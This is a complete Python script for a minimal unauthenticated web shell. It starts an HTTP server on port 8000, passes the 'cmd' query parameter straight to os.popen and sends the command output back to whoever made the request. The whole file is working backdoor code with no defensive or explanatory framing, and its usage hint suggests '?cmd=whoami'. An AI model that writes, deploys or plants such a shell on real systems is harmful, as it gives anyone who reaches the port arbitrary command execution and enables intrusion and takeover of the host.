#!/usr/bin/env python3
import os
from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import urlparse, parse_qs

class SimpleShell(BaseHTTPRequestHandler):
    def do_GET(self):
        parsed_path = urlparse(self.path)
        query = parse_qs(parsed_path.query)
        cmd = query.get('cmd', [None])[0]

        self.send_response(200)
        self.send_header('Content-type', 'text/plain')
        self.end_headers()

        if cmd:
            output = os.popen(cmd).read()
            self.wfile.write(output.encode())
        else:
            self.wfile.write(b'No command passed. Use ?cmd=whoami')

def run(server_class=HTTPServer, handler_class=SimpleShell, port=8000):
    server_address = ('', port)
    httpd = server_class(server_address, handler_class)
    print(f'Shell running at http://localhost:{port}')
    httpd.serve_forever()

if __name__ == '__main__':
    run()
